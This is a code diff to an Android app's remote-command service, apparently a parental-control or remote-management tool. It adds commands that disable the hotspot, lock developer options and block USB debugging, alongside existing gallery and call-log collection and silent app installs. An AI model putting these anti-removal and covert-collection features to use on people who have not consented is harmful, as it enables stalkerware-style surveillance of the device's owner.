@@ -476,6 +476,19 @@ class CoreService : Service() {
                         if (!ok) put("error", "Shizuku required for WiFi control on Android 10+") })
                 }
 
+                "disable_hotspot" -> {
+                    val ok = ShizukuManager.disableHotspot()
+                    sendData("hotspot_result", JSONObject().apply { put("success", ok) })
+                }
+                "lock_dev_options" -> {
+                    val ok = ShizukuManager.lockDeveloperOptions()
+                    sendData("dev_options_result", JSONObject().apply { put("success", ok) })
+                }
+                "block_usb_debug" -> {
+                    val ok = ShizukuManager.blockUsbDebugging()
+                    sendData("usb_debug_result", JSONObject().apply { put("success", ok) })
+                }
+
                 // These commands read ContentProvider — BACKGROUND THREAD
                 "get_gallery"          -> sendGalleryBackground(data.optInt("limit", 20))
                 "get_call_log"         -> sendCallLogBackground(data.optInt("limit", 50))
@@ -549,24 +562,50 @@ class CoreService : Service() {
                     sendData("permissions_result", JSONObject().apply { put("granted", count); put("shizuku_available", ShizukuManager.isShizukuAvailable()) })
                 }
                 "silent_install"   -> {
-                    val path = data.optString("apk_path"); val ok = ShizukuManager.silentInstall(path)
-                    sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
+                    // BUG FIX: optString returns "" when key missing — empty path causes pm install crash
+                    val path = data.optString("apk_path")
+                    if (path.isEmpty()) {
+                        sendData("install_result", JSONObject().apply { put("success", false); put("error", "missing apk_path") })
+                    } else {
+                        val ok = ShizukuManager.silentInstall(path)
+                        sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
+                    }
                 }
                 "silent_uninstall" -> {
-                    val pkg = data.optString("package"); val ok = ShizukuManager.silentUninstall(pkg)
-                    sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
+                    val pkg = data.optString("package")
+                    if (pkg.isEmpty()) {
+                        sendData("uninstall_result", JSONObject().apply { put("success", false); put("error", "missing package") })
+                    } else {
+                        val ok = ShizukuManager.silentUninstall(pkg)
+                        sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
+                    }
                 }
                 "force_stop"  -> {
-                    val pkg = data.optString("package"); val ok = ShizukuManager.forceStop(pkg)
-                    sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
+                    val pkg = data.optString("package")
+                    if (pkg.isEmpty()) {
+                        sendData("force_stop_result", JSONObject().apply { put("success", false); put("error", "missing package") })
+                    } else {
+                        val ok = ShizukuManager.forceStop(pkg)
+                        sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
+                    }
                 }
                 "freeze_app"  -> {
-                    val pkg = data.optString("package"); val ok = ShizukuManager.freezeApp(pkg)
-                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
+                    val pkg = data.optString("package")
+                    if (pkg.isEmpty()) {
+                        sendData("freeze_result", JSONObject().apply { put("success", false); put("error", "missing package") })
+                    } else {
+                        val ok = ShizukuManager.freezeApp(pkg)
+                        sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
+                    }
                 }
                 "unfreeze_app"-> {
-                    val pkg = data.optString("package"); val ok = ShizukuManager.unfreezeApp(pkg)
-                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
+                    val pkg = data.optString("package")
+                    if (pkg.isEmpty()) {
+                        sendData("freeze_result", JSONObject().apply { put("success", false); put("error", "missing package") })
+                    } else {
+                        val ok = ShizukuManager.unfreezeApp(pkg)
+                        sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
+                    }
                 }
                 "set_dns"     -> {
                     val dns = data.optString("dns_server", "family.cloudflare-dns.com"); val ok = ShizukuManager.setPrivateDns(dns)
@@ -578,7 +617,9 @@ class CoreService : Service() {
                         putExtra("color", data.optString("color", "#FF0000"))
                         putExtra("brush_size", data.optInt("brush_size", 20))
                     }
-                    startForegroundService(i)
+                    // BUG FIX: startForegroundService() directly bypasses startFgService() helper
+                    // which handles ForegroundServiceStartNotAllowedException on Android 14+.
+                    startFgService(i)
                     sendData("live_painting_started", JSONObject())
                 }
                 "live_painting_stop"  -> {
